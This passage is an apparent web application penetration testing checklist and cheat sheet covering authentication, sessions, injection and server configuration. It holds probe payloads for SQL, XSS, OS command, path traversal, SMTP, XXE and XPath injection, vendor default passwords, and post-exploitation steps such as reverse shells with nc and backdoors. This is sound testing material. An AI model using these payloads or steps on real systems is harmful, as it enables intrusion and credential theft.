if no account logout, no lockout policy


### Test Any Account Recovery Function ###

do complete walk-through over recovery process
check if it is possible to select a challenge
if so use list of enumerated or common usernames to harvest list of challenge
look for easy challenges in gathered list
do the same for password hints
if the process involves an email, search for possibiliy of getting the mail
change receiver address or predict unique recovery URLs
get multiple URLs to search for repeating pattern


### Test Any Remember Me Function ### (chapter 5)

check if user can use function to log in without credentials
inspect persistent cookies
look for data that identifies user
try to predict the data
check for encoding/obfuscating
modify the content of own cookie in suitable ways


### Test Any Impersonation Function ###

only if explicit functionality to impersonate user without proper authorization exists
look for user supplied data that is used to determine the target of impersonating
try to escalate priviliges
check if a user can have multiple passwords -> backdoor to access app as any user


### Test Username Uniqueness ###

try to register with same username but different credentials
if app blocks -> enumerate usernames
if app accepts -> try registration using same username and password
    if app blocks -> bruteforce automated to find colision of passwords of other user
    if app accept -> try determine how to the application differs multiple users with same credentials and names


### Test Predictability Autogenerated Credentials ###

if app generates usernames or passwords, obtain several values, and search fot pattern or sequences
try to obtain possible list of usernames or passwords for bruteforce later


### Check for Unsafe Transmission Credentials ###

walk through all authentication functions
login, registration, password change, updating profile informations
monitor passed traffic of both directions
if credentials in URL, possible disclosure on browser history / on screen
if credentials in cookie, possible vulnerable to XSS hijacking
if credentials are unencrypted, possible eavesdropping
if credentials transmitted over HTTPS only on login form itself, possible MITM


### Check Unsafe Distribution Credentials ###

determine if account credentials are created/transitted out-of-band
e-mail, postal address, URL
if URL -> get several URLs and try to predict new URLs
          try to reuse URL multiple times
          reuse URL while logged in
          reuse URL while logged out -> is it possible to use URL to reset password?


### Test Insecure Storage ###

if you get hashed passwords -> collect same hashes of different user and try to login with common passwords for given user
use offline rainbow tables


### Test Fail-Open Conditions ###

walk trough process of user credential validation
collect all request parameter submitted to the application
repeat submitting with modified parameters
empty string
remove name/value pair
very long/short values
string instead numbers (vice versa)
submit same named parameter multiple times with different value
review application responses
if multiple modifications change the response behavior combine the changes


### Test Any Multistage Mechanisms ###

if authentication has series of different requests -> modify the seuquence of requests
proceed sequences in different order
proceed directly to each stage in turn and continue the normal sequence from there
proceed through normal sequences skipping each single sequence in turn
check if a single piece of information is submitted at more than one stage
if so try different values at different stages
check if parameter are transmitted multiple times in hidden fields
if random challenges in process -> check if challenge can be chosen by modifing a submitted parameter
                                   check how challenge differs for different user
                                   try to get easy challenges


### Exploit Any Vulnerabilities Gain Unauthorized Access ###

review found vulnerbalities and try to login as different user
before using automated attacks identify if user lockout is policy is present
password guessing attack: breadth first, depth second
construct wordlists with quality rules and password validation rules in mind


### Understand Mechanism ###

analyze managment of sessions and states
HTTP cookies, query string parameters, hidden form fields
if app uses session tokens -> find out which peace of data reidentifies a user
find a page that is sessions-dependent
make several requests, systematically removing each item that you suspect
use Burp Repeater
modify token value 1 byte at a time to check if value is still accepted


### Test Tokens Meaning ### (Chapter 14)

log in as different users several times to get multiple tokens
use similar usernames like: A, AA, AAA, AAAA, AAAAB, ...
perform similar actions for other user related informations, that are submitted
analyze tokens for correlation related to username and other user controllable data
look at correlation of user/data length (indicates that encoding/obfuscation is active)
same character sequence in name maybe also in token (indicates XOR obfuscation)
only hex in token (indicates encoding as ASCII)
only a-z A-Z 0-9 + / (indicates base64)
automatic generate different tokens and try to reach page that is session-dependant
try various decodings


### Test Tokens Predictability ### (Chapter 7)

generate and capture a large number of session tokens in quick succession
for example successful login request
identify patterns using Burp Sequencer
wait a few minutes an gather again a large number of tokens (indicates time dependence)
use different IP address and gather a large amount of tokens
use the bit flipper in Burp Intruder (grep a string in session that indicates valid/invalid session or session of different user)


### Check Insecure Transmission Tokens ###

walk through the app starting as normal user, log in, and go through all functionality of app
notice all new session token issued, and which part is using HTTPS or HTTPS
if HTTP cookie are being used -> check if secure flag is set
try to find cookies that are transmitted over HTTP -> if so vulnerable to interception
if app switches between HTTP and HTTPS -> check whether a HTTP token stays active in HTTPS -> if so vulnerable to interception
if HTTPS area contains URL to HTTP -> check if any token is submitted and if this token stays valid


### Check Disclosure Tokens Logs ###

if app contains any logging, monitoring, diagnostic functionality, check who is authorized to access them
identify all instances where sessions tokens are transmitted via URL
identify all Referer header of any off-site link containing tokens
check if you can inject arbitrary off-site links into page, to get this tokens
try to get administrative token


### Check Mapping Tokens Sessions ### (Chapter 7)

log in app twice using same account from different browser/computer
check if both sessions remain active (attacker could compromise without risk of detection)
check if new session token is issued each time you log in with same user -> if so no way of protection against concurrent logins
try to modify session token to get session of another user


### Test Session Termination ###

check if session expiration is implemented on the server
login and obtain token, wait without using the token (use Burp Intruder)
check if logout function exists
test if this function is effective, log out and attempt to reuse old token and check if it is still valid
if so vulnerable to session hijacking after log out (use Burp Repeater)


### Check Session Fixation ###

if app issues token to unauthenticated users -> obtain token and perform log in
                                             if no fresh token -> vulnerable to session fixation
log in as normal user and try to get to the log in page
log in as another user and compare tokens
if the tokens is not fresh -> vulnerable to session fixation
modify a token with invented values
if app is accepting -> vulnerable to session fixation


### Check CSRF ###

if app uses HTTP cookies, possibly vulnerable to cross site request forgery attacks
identify functionlaity, where an attacker can determine parameter for request made by user -> vulnerable CSRF
create HTML page that will ussue the desired request without user interaction
for GET request place <img> tag with src parameter to vulnerable URL
for POST request create form with hidden fields and target to vulnerable URL
use java script to auto submit as soon as page loads
test if CSRF it successful
test if app is vulnerable to UI redress attacks


### Check Cookie Scope ###

if app uses HTTP cookies -> review the relevant Set-Cookie headers for path/domain attributes to determine the scope of cookie
if app liberalizes its cookies scope to parent domain -> maybe vulnerable to attacks via other websites
if app set its cookies domain scope to its own domain name -> maybe vulnerable to attack via subdomain
determine all domain names and paths that will receive a cookie of the target app and try to XSS them in order to get the cookie


### Understand Access Control Requirements ###

identify all user controllable parameters that the servcer side processes
URL query string, HTTP cookies, Referer, User-Agent, parameter in the request body
fuzz this parameter using Burp Intruder

SQL Injection:
'
'--
'; waitfor delay '0:30:0'--
1; waitfor delay '0:30:0'--

XSS And Header Injection:
xsstest
"><script>alert('xss')</script>

Os Command Injection:
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
| ping –i 30 127.0.0.1 |
| ping –n 30 127.0.0.1 |
& ping –i 30 127.0.0.1 &
& ping –n 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping –i 30 127.0.0.1 %0a
` ping 127.0.0.1 `

Path Traversal
../../../../../../../../../../etc/passwd
../../../../../../../../../../boot.ini
..\..\..\..\..\..\..\..\..\..\etc\passwd
..\..\..\..\..\..\..\..\..\..\boot.ini

Script Injection:
pt Injection
;echo 111111
echo 111111
response.write 111111
:response.write 111111

File Inclusion:
http://<your server name>/
http://<nonexistent IP address>/

all ? , ; , & , + , = , and space need to be URL-encoded (Burp Intruder does this by default)

specify in Grep function of Burp Intruder strings that flags common error messages:
error
exception
illegal
invalid
fail
stack
access
directory
file
not found
varchar
ODBC
SQL
SELECT
111111 (because of respone.write and echo and so on)

set up a web server or netcat listener to monitor connection attemps received from file inclusion attacks
review all results for any anomalies
HTTP status coden response length, response time, appearance of your configured expressions
identify out-of-band channels whereby user-controllable input can be introduced and perform fuzzing on that channel
run automated web application scanner to compare the results with your own fuzzing


### Test SQL Injection ### (Chapter 9)

if the SQL fuzzing bring any results, analyze the database error message to determine the database version and language
if submitting a single ' causes an error -> submit '' and check if the error disappears (indicates vulnerable SQL injection)
try common concatenator functions to construct a equivalent string to some benign input
example normal input: FOO
'||'FOO
'+'FOO
' 'FOO
if the response stays the same -> vulnerble for SQL injection
if original input is numeric (example 2) -> use 1+1
try if ASCII encoding is possible (example origin input: 2)
67-ASCII(‘A’)
51-ASCII(1)
test if the waitfor command causes a time delay in response
modify conditions in a WHERE clause to chanve the logic and retrieve more output (example: 1=1--)
use UNION operator to SELECT of other tables
fingerprint the database type
if MS-SQL -> enumerate database structure
try to bypass input filter
escalate attack against database to own the underlying server


### Identify Reflected Request Parameters ###

sort out matches of fuzzing where payload of XSS test is appearing in response
if match appears in HTTP body -> vulnerable to XSS
if match appears in HTTP header -> vulnerable to header injection


### Test Reflected XSS ### (Chapter 12)

check if found XSS vulnerabilities can be used to inject arbitrary JavaScript
bypass signature-based filters
check if santization or filtering is active
if app is blocking/HTML-encoding input containing certain char -> try encoding chars or workaround without this chars
if XSS vulnerability appears in POST -> XSS still possible using form with hidden fields
otherwise maybe parameters via POST can also be used in POST request


### Test HTTP Header Injection ### (Chapter 13)

for each place within the response headers where the value of the request parameter appears
verify if app is accepting URL-encoded carraige-return %0d and line-feed %0a char (line break in header)
if so -> vulnerable to HTTP header injection
if not -> try to encode char
foo%00%0d%0abar
foo%250d%250abar
foo%%0d0d%%0a0abar


### Test Open Redirection ### (Chapter 13)

if reflected input specifies target of redirection -> craft input that redirects to external website
if app transmits an absolute URL as parameter value -> modify domain name
if app transmits an relative URL as parameter value -> modify this value to absolute URL
try to bypass encdoing filter it there are some


### Test Stored Attacks ###

check if app stores items of user-suplied arbitrary input and if these input is displayed somewhere
if input is only stored after terminating multistage process -> do so manualy (only if automatic not possible)
use this to escalate privillege by session injecting admin account
identify all file upload/download functions
test possible formats: HTML, JAR, TXT and if the content is filtered
if JPG is accepted -> try appending .jpg to a different file and try to upload it
try to XSS or CSRF inside the uploaded file


### Test OS Command Injection ###

if OS command injection while fuzzing was successfull -> try ls/dir command
if ls/dir not possible -> use TFTP to copy tools up to the server or create reverse shell (nc)
write results of command execution to a file that can be read by your browser
detect privilege level (whoami) -> escalate privileges / gain backdoor access
if app is filtering some chars -> encode them (example blank - $IFS)


### Test Path Traversal ###

all parameters containg a file name are possibly vulnerable to path travseral attack
if paths like this return the same result -> vulnerable to path traversal attack
file=foo/file1.txt
file=foo/bar/../file1.txt
encode / and .. to bypass filter
use null byte or newline to bypass extension filters
../../../../../boot.ini%00.jpg
../../../../../etc/passwd%0a.jpg
bypass filters that check if first directory is valid
/images/../../../../../../../etc/passwd
try to retrieve password, operating system, application, configuration, XML, MySQL data, source code or log files
try to create scripts in the user startup foldder
modify in.ftpd to execute ommands when a user next connects
write scripts to web directory and execute them with web permissions via browser


### Test File Inclusion ###

if you receive any incoming HTTP connection from taget app while fuzzing -> vulnerable to remote file inclusion
determine which parameter triggered the connectoin request
set up a web server containing a malicious script specific to the language you are targeting
try if the scripts are being executed


### Test SMTP Injection ###

for each request employed in e-mail–related functionality submit following:
use Burp Intruder
<youremail>%0aCc:<youremail>

<youremail>%0d%0aCc:<youremail>

<youremail>%0aBcc:<youremail>

<youremail>%0d%0aBcc:<youremail>

%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>

%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a

%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a

review results and identify any error message
check if any e-mail has been received successfully


### Test Buffer Overflows ###

submit a range of long strings with length longer that common buffer size
common size: 1100, 4200, 33000 (use Burp Intruder)
monitor app response for anomalies
HTTP 500, failure message, malformed response, closing TCP connection, crash of app, unexpected data


### Test Integer Vulnerabilities ###

submit integers with boundary value
use boundray of signed and unsigned values:
0x7f and 0x80 (127 and 128)
0xff and 0x100 (255 and 256)
0x7ffff and 0x8000 (32767 and 32768)
0xffff and 0x10000 (65535 and 65536)
0x7fffffff and 0x80000000 (2147483647 and 2147483648)
0xffffffff and 0x0 (4294967295 and 0)
if data represented in hexadecimal form -> send little and big endien versions of each test case
example: ff7f and 7fff
modify any anomalies


### Test Format String Vulnerabilities ###

submit string containing long sequences of differen format specifiers
%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...
%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...
monitor app response for any anomalies


### Test SOAP Injection ###

target parameter you suspect beeing processes via SOAP message
submit rogue XML closing tag </foo>
if no error -> not inserted in SOAP
if error occurs -> submit <foo> </foo>
                   if error disappears -> vulnerable to SOAP injection
if submitted data copied back into application response -> submit
                   test <foo/>
				   test <foo></foo>
				   if only test returns -> vulnerable to SOAP injection
try to insert comment chars:
<!-- -->
--> <!--
because you can not know the order of the XML


### Test LDAP Injection ###

submit * in any user-supplied data that is used to retrieve information from a directory service
if large number of results are returned -> LDAP
try entering )))))))))
if error occurs -> app may be vulnerable
try entering following chars to influence result that are beeing returned
)(cn=*
*))(|(cn=*
*))%00
try adding extra attrbiutes at the end of input, using commans to separate them
cn
c
mail
givenname
o
ou
dc
l
uid
objectclass
postaladdress
dn
sn


### Test XPath Injection ###

try to submit following values and see if they result in different app behavior without causing an error
' or count(parent::*[position()=1])=0 or 'a'='b
' or count(parent::*[position()=1])>0 or 'a'='b
if parameter is numeric, try:
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0
if preceding strings causes differential behavior -> determine the name of the current nodes parent (1 byte at a time)
substring(name(parent::*[position()=1]),1,1)='a'
having extracted the name of the parent node, extract all the data withing the XML tree
substring(//parentnodename[position()=1]/child::node()[position()=1]/text(),1,1)='a'


### Test Back-End Request Injection ### (Chapter 10)

locate any instance where an internal server name or IP address is specified in a parameter
submit an arbitrary server and port (random IP, localhost, and own IP), and wait for timeout or incoming traffic
try to append injected parameter to request parameter that returns a specific page for a specific value
%26foo%3dbar (URL-encoded &foo=bar )
%3bfoo%3dbar (URL-encoded ;foo=bar )
%2526foo%253dbar (Double URL-encoded &foo=bar )
if app behaves normal -> possibly vulnerable to HTTP parameter injection


### Test for XXE Injection ###

if user can submit XML to the server -> attempt to specify an external entity
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 115
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///windows/win.ini" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
if no field can be found -> specify "http://192.168.1.1:25"
longer response time -> vulnerable to XXE injection


### Identify Key Attack Surface ###

identify Multistage processes
critical security functions (login)
transitions across trust boundaries
context-base functionality
adjustments made to transaction prices or quantities


### Test Multistage Processes ###

submit requests out of the expected sequence (skip stages, change order)
try taking parameter that are submitted at one stage and submit them at a different stage
if process involves different users performing operations, switch the data submited by the users
understand assumptions that developer made and try to violate those 
read error and warning messages to understand the logic


### Test Handling Incomplete Input ###

for each parameter in turn, remove both the name and value before submit


### Test Trust Boundaries ###

find functionality where a user can provide personal information to gain trust of app
example recover account functionality
try to make improper transitions across trust boundaries
example having completed (partly) account recovery process, attempt to switch to an authenticated user-specific page


### Test Transaction Logic ###

in cases where the application imposes transaction limits
try to submit large amount in the opposite direction
look for user controlled value adjustments and modify them


### Test Segregation Shared Infrastructures ###

if app is hosted on shared infrastructure examine the access mechanisms provied for customers
does the remote access facility use a secure protocol
can customers access files/data on the server
can customers gain an interactive shell
can you compromise the server environment to compromise the app


### Test Default Credentials ###

identify web server and other components that give access to admin interface
perform a port scan
for any identified interfaces, try to log in using default password of vendor
if you gain accessm can it be used to further compromise the host or app


### Test for Default Content ###

scan with Nikto to identify any default content
use search engine to find default content included within the technologies you know to be in use
search for vulnerabilites in this content


### Test Dangerous HTTP Methods ###

use the OPTIONS method to list the HTTP methods that the server states available
scan with Paros
try each reported method manually to confirm
if you find some WebDAV methods -> use a WebDAV-enabled client for further investigation


### Test Proxy Functionality ###

try using the web server as proxy (GET, CONNECT) to connect to different IP addresses and ports (127.0.0.1)


### Test Virtual Hosting Misconfiguration ###

submit GET request to the root directory using
correct Host header, bogus Host header, servers IP address in Host header, no Host header (HTTP/1.0 only)
compare the responses (commonly directory listing is enabled when Host header is servers IP address)
use Nikto -vhost to identify default content


### Test Web Server Software Bugs ###

run Nessus, OpenVAS or other scanner
use Nmap, Metasploit and Hiraki


### Test for Web Application Firewalling ###

submit an arbitrary parameter name to the application with a clear attack
if app blocks -> there is a external defense
if particular request is blocked -> try submitting the same parameter in a different location or context
on ASP.NET try submitting the parameter as a cookie
Request.Params[“foo”]
try to split java script over multiple variables


### Check DOM-Based Attacks ###

identify all uses of the following APIs
document.location
document.URL
document.URLUnencoded
document.referrer
window.location
trace the relevant data trough the code to identify what actions there perfom
if the data is passed to one of the following places, it is vulnerable to DOM XSS
document.write()
document.writeln()
document.body.innerHtml
eval()
window.execScript()
window.setInterval()
window.setTimeout()
if the data is passed to one of following places, it is vulnerable to rediraction attack
document.location
document.URL
document.open()
window.location.href
window.navigate()
window.open()


### Check Local Privacy Vulnerabilities ###

identify all Set-Cookie directives
if any of them contains an expires attribute with a future date, it is a persistent cookie
persistent cookies that contains sensitive data, can be obtained by local attacker
if any application pages containing sensitive data in HTTP, look for cache directives within server response
check if 'autocomplete=off' is not set for forms that contains sensitive data
check for Flash local objects using the BetterPrivacy Firefox addon
check any use of HTML5 local storage


### Check Weak SSL Ciphers ###

if app uses SSL, check used ciphers with THCSSLCheck
if any weak cipher protocol is supported try to downgrade SSL communication


### Check Same-Origin Policy Configuration ###

check for the /crossdomain.xml file
check if app allows unrestircted access <allow-access-from domain=”*” /> from any other site
if so any other domain can perform two-way interaction between target app and user
check for the /clientaccesspolicy.xml file
test application’s handling of cross-domain requests using XMLHttpRequest by adding an Origin header specifying a different domain

#######################################################################################
################################ Cheatsheet ###########################################

### HTTP status codes ###
1xx — Informational
2xx — The request was successful
3xx — The client is redirected to a different resource
4xx — The request contains an error of some kind
5xx — The server encountered an error fulfi lling the request

### detail status codes ###
100 Continue
200 OK
201 Created
301 Moved Permanently
302 Found
304 Not Modified
400 Bad Request
401 Unauthorized
403 Forbidden
404 Not Found
405 Method Not Allowed
413 Request Entity Too Large
414 Request URI Too Long
500 Internal Server Error
503 Service Unavailable

URL encoding:
%3d - =
%25 - %
%26 - &
%20 - Space
%2b - +
%3b - ;
%0a - New line
%00 - Null byte

HTML encoding:
&quot; — "
&apos; — '
&amp; — &
&lt; — <
&gt; — >

as ASCII:
&#34; — "
&#39; — '

as ASCII in hex:
&#x22; — "
&#x27; — '

Request Parameters:
/dir/file;foo=bar&foo2=bar2
/dir/file?foo=bar$foo2=bar2
/dir/file/foo%3dbar%26foo2%3dbar2
/dir/foo.bar/file
/dir/foo=bar/file
/dir/file?param=foo:bar
/dir/file?data=%3cfoo%3ebar%3c%2ffoo%3e%3cfoo2%3ebar2%3c%2ffoo2%3e

File Extensions:
asp — Microsoft Active Server Pages
aspx — Microsoft ASP.NET
jsp — Java Server Pages
cfm — Cold Fusion
php — The PHP language
d2w — WebSphere
pl — The Perl language
py — The Python language
dll — Usually compiled native code (C or C++)
nsf or ntf — Lotus Domino

Directory Names:
servlet — Java servlets
pls — Oracle Application Server PL/SQL gateway
cfdocs or cfide — Cold Fusion
SilverStream — The SilverStream web server
WebObjects or {function}.woa — Apple WebObjects
rails — Ruby on Rails

Session Tokens:
JSESSIONID — The Java Platform
ASPSESSIONID — Microsoft IIS server
ASP.NET_SessionId — Microsoft ASP.NET
CFID / CFTOKEN — Cold Fusion
PHPSESSID — PHP

Common components of session tokens:
The account username
The numeric identifi er that the application uses to distinguish between
accounts
The user's first and last names
The user's e-mail address
The user's group or role within the application
A date/time stamp
An incrementing or predictable number
The client IP address

find OS command injection:
| ping –i 30 127.0.0.1 |
| ping –n 30 127.0.0.1 |
& ping –i 30 127.0.0.1 &
& ping –n 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping –i 30 127.0.0.1 %0a
` ping 127.0.0.1 `

finding path traversal:
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini

Encoding for path traversal:
URL
Dot — %2e
Forward slash — %2f
Backslash — %5c

Unicode
Dot — %u002e
Forward slash — %u2215
Backslash — %u2216

double URL
Dot — %252e
Forward slash — %252f
Backslash — %255c

finding SMTP injection flaws:
<youremail>%0aCc:<youremail>

<youremail>%0d%0aCc:<youremail>

<youremail>%0aBcc:<youremail>

<youremail>%0d%0aBcc:<youremail>

%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a

%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a

keywords for error messages:
error
exception
illegal
invalid
fail
stack
access
directory
file
not found
varchar
ODBC
SQL
SELECT

default credentials:
Apache Tomcat:
admin (none)
tomcat tomcat
root root

Sun JavaServer:
admin admin

Netscape Enterprise Server:
admin admin

Compaq Insight Manager:
administrator administrator
anonymous (none)
user user
operator operator
user public

Zeus:
admin (none)

common source codes comments:
bug
problem
bad
hope
todo
fix
overflow
crash
inject
xss
trust

Java User-Supplied Data:
getParameter
getParameterNames
getParameterValues
getParameterMap
Parameters within the URL query string and the body of a POST request are stored as a map of String names to String values, which can be accessed using these APIs.

getQueryString
Returns the entire query string contained within the request and can be used as an alternative to the getParameter APIs.

getHeader
getHeaders
getHeaderNames
HTTP headers in the request are stored as a map of String names to String values and can be accessed using these APIs.

getRequestURI
getRequestURL
These APIs return the URL contained within the request, including the query string.

getCookies
Returns an array of Cookie objects, which contain details of the cookies received in the request, including their names and values.

getRequestedSessionId
Used as an alternative to getCookies in some cases; returns the session ID value submitted within the request.

getInputStream
getReader
These APIs return different representations of the raw request received from the client and therefore can be used to access any of the information obtained by all the other APIs.

getMethod
Returns the method used in the HTTP request.

getProtocol
Returns the protocol used in the HTTP request.

getServerName
Returns the value of the HTTP Host header.

getRemoteUser
getUserPrincipal
If the current user is authenticated, these APIs return details of the user, including his login name. If users can choose their own username during self-registration, this may be a means of introducing malicious input into the application's processing.

Java Session Interaction:
setAttribute
putValue
Used to store data within the current session.

getAttribute
getValue
getAttributeNames
getValueNames
Used to query data stored within the current session.

Reading / Writing Files in Java:
java.io.FileInputStream
java.io.FileOutputStream
java.io.FileReader
java.io.FileWriter

often vulnerablte database access in Java:
java.sql.Connection.createStatement
java.sql.Statement.execute
java.sql.Statement.executeQuery

OS command execution Java:
java.lang.runtime.Runtime.getRuntime
java.lang.runtime.Runtime.exec

Redirection Java:
javax.servlet.http.HttpServletResponse.sendRedirect
javax.servlet.http.HttpServletResponse.setStatus
javax.servlet.http.HttpServletResponse.addHeader

Security relevant configuration setting Java:
login-config
Authentication details can be confi gured within the login config element. The two categories of authentication are forms-based (the page is specified by the form-login-page element) and Basic Auth or Client-Cert, specified within the authmethod element. If forms-based authentication is used, the specified form must have the action defined as j_security_check and must submit the parameters j_username and j_password. Java applications recognize this as a login request.

security-constraint
If the login-config element is defi ned, resources can be restricted using the security-constraint element. This can be used to defi ne the resources to be protected. Within the security-constraint element, resource collections can be defi ned using the url-pattern element. For
example:
<url-pattern>/admin/*</url-pattern>
These are accessible to roles and principals defi ned in the role-name and principal-name elements, respectively.

session-config
The session timeout (in minutes) can be confi gured within the session-timeout element.

error-page
The application's error handling is defined within the error-page element. HTTP error codes and Java exceptions can be handled on an individual basis through the error-code and exception-type elements.

init-param
Various initialization parameters are confi gured within the init-param element. These may include security-specifi c settings such as listings, which should be set to false, and debug, which should be set to 0.


ASP.NET user supplied data:
Params
Parameters within the URL query string, the body of a POST request, HTTP cookies, and miscellaneous server variables are stored as maps of string names to string values. This property returns a combined collection of all these parameter types.

Item
Returns the named item from within the Params collection.

Form
Returns a collection of the names and values of form variables submitted by the user.

QueryString
Returns a collection of the names and values of variables within the query string in the request.

ServerVariables
Returns a collection of the names and values of a large number of ASP server variables (akin to CGI variables). This includes the raw data of the request, query string, request method, HTTP Host header, and so on.

Headers
HTTP headers in the request are stored as a map of string names to string values and can be accessed using this property.

Url
RawUrl
Return details of the URL contained within the request, including the query string.

UrlReferrer
Returns information about the URL specifi ed in theHTTP Referer header in the request.

Cookies
Returns a collection of Cookie objects, which contain details of the cookies received in the request, including their names and values.

Files
Returns a collection of fi les uploaded by the user.

InputStream
BinaryRead
Return different representations of the raw request received from the client and therefore can be used to access any of the information obtained by all the other APIs.

HttpMethod
Returns the method used in the HTTP request.

Browser
UserAgent
Return details of the user's browser, as submitted in the HTTP User-Agent header.

AcceptTypes
Returns a string array of client-supported MIME types, as submitted in the HTTP Accept header.

UserLanguages
Returns a string array containing the languages accepted by the client, as submitted in the HTTP Accept-Language header.


ASP.NET session interaction:
Add
Adds a new item to the session collection.

Item
Gets or sets the value of a named item in the collection.

Keys
GetEnumerator
Return the names of all items in the collection.

CopyTo
Copies the collection of values to an array.

ASP.NET file access
System.IO.FileStream
System.IO.StreamReader
System.IO.StreamWriter

ASP.NET database access:
System.Data.SqlClient.SqlCommand
System.Data.SqlClient.SqlDataAdapter
System.Data.Oledb.OleDbCommand
System.Data.Odbc.OdbcCommand
System.Data.SqlServerCe.SqlCeCommand

ASP.NET command execution:
System.Diagnostics.Start.Process
System.Diagnostics.Start.ProcessStartInfo

ASP.NET URL redirection:
System.Web.HttpResponse.Redirect
System.Web.HttpResponse.Status
System.Web.HttpResponse.StatusCode
System.Web.HttpResponse.AddHeader
System.Web.HttpResponse.AppendHeader
Server.Transfer

ASP.NET security relevant settings:
httpCookies
Determines the security settings associated with cookies. If the httpOnlyCookies attribute is set to true, cookies are fl agged as HttpOnly and therefore are not directly accessible from client-side scripts. If the requireSSL attribute is set to true, cookies are fl agged as secure and therefore are transmitted by browsers only within HTTPS requests.

sessionState
Determines how sessions behave. The value of the timeout attribute determines the time in minutes after which an idle session will be expired. If the regenerateExpiredSessionId element is set to true (which is the default), a new session ID is issued when an expired session ID is received.

compilation
Determines whether debugging symbols are compiled into pages, resulting in more verbose debug error information. If the debug attribute is set to true, debug symbols are included.

customErrors
Determines whether the application returns detailed error messages in the event of an unhandled error. If the mode attribute is set to On or RemoteOnly, the page identifi ed by the defaultRedirect attribute is displayed to application users in place of detailed system-generated messages.

httpRuntime
Determines various runtime settings. If the enableHeader-
Checking attribute is set to true (which is the default), ASP.NET checks request headers for potential injection attacks, including cross-site scripting. If the enableVersionHeaderattribute is set to true (which is the default), ASP.NET out-puts a detailed version string, which may be of use to an attacker in researching vulnerabilities in specifi c versions of the platform.


PHP user supplied data:
$_GET
$HTTP_GET_VARS
Contains the parameters submitted in the query string. These are accessed by name. For example, in the following URL: $HTTP_GET_VARS https://wahh-app.com/search.php?query=foo the value of the query parameter is accessed using: $_GET['query']

$_POST
$HTTP_POST_VARS
Contains the parameters submitted in the request body.

$_COOKIE
$HTTP_COOKIE_VARS
Contains the cookies submitted in the request.

$_REQUEST
Contains all the items in the $_GET, $_POST, and $_COOKIE arrays.

$_FILES
$HTTP_POST_FILES
Contains the fi les uploaded in the request.

$_SERVER['REQUEST_METHOD']
Contains the method used in the HTTP request.

$_SERVER['QUERY_STRING']
Contains the full query string submitted in the request.

$_SERVER['REQUEST_URI']
Contains the full URL contained in the request.

$_SERVER['HTTP_ACCEPT']
Contains the contents of the HTTP Accept header.

$_SERVER['HTTP_ACCEPT_CHARSET']
Contains the contents of the HTTP Accept-charset header.

$_SERVER['HTTP_ACCEPT_ENCODING']
Contains the contents of the HTTP Accept-encoding header.

$_SERVER['HTTP_ACCEPT_LANGUAGE']
Contains the contents of the HTTP Accept-language header.

$_SERVER['HTTP_CONNECTION']
Contains the contents of the HTTP Connection header.

$_SERVER['HTTP_HOST']
Contains the contents of the HTTP Host header.

$_SERVER['HTTP_REFERER']
Contains the contents of the HTTP Referer header.

$_SERVER['HTTP_USER_AGENT']
Contains the contents of the HTTP User-agent header.

$_SERVER['PHP_SELF']
Contains the name of the currently executing script. Although the script name itself is outside an attacker's control, path information can be appended to this name. For example, if a script contains the following code: <form action=”<?= $_SERVER['PHP_SELF'] ?>”>an attacker can craft a cross-site script- ing attack as follows: /search.php/”><script> and so on.

PHP file access:
fopen
readfile
file
fpassthru
gzopen
gzfile
gzpassthru
readgzfile
copy
rename
rmdir
mkdir
unlink
file_get_contents
file_put_contents
parse_ini_file
include
include_once
require
require_once
virtual

PHP database access:
mysql_query
mssql_query
pg_query

PHP OS code execution:
passthru
popen
proc_open
shell_exec
system
The backtick operator ( ` )

PHP URL redirection:
http_redirect
header
HttpMessage::setResponseCode
HttpMessage::setHeaders

PHP configuration options:
allow_url_fopen
If disabled, this directive prevents some fi le functions from accessing remote fi les (as described previously).

allow_url_include
If disabled, this directive prevents the PHP fi le include functions from being used to include a remote fi le.

display_errors
If disabled, this directive prevents PHP errors from being reported to the user's browser. The log_errors and error_log options can be used to record error information on the server for diagnostic purposes. file_uploads If enabled, this directive causes PHP to allow fi le uploads over HTTP.

upload_tmp_dir
This directive can be used to specify the temporary
directory used to store uploaded fi les. This can be used to ensure that sensitive fi les are not stored in a world readable location.

Perl user supplied data:
param
param_fetch
Called without parameters, param returns a list of all the parameter names in the request. Called with the name of a parameter, param returns the value of that request parameter. The param_fetch method returns an array of the named parameters.

Vars
Returns a hash mapping of parameter names to values.

cookie
raw_cookie
The value of a named cookie can be set and retrieved using the cookie function. The raw_cookie function returns the entire contents of the HTTP Cookie header, without any parsing having been performed.

self_url
url
Return the current URL, in the fi rst case including any query string.

query_string
Returns the query string of the current request.

referer
Returns the value of the HTTP Referer header.

request_method
Returns the value of the HTTP method used in the request.

user_agent
Returns the value of the HTTP User-agent header.

http
https
Return a list of all the HTTP environment variables derived from the current request.

ReadParse
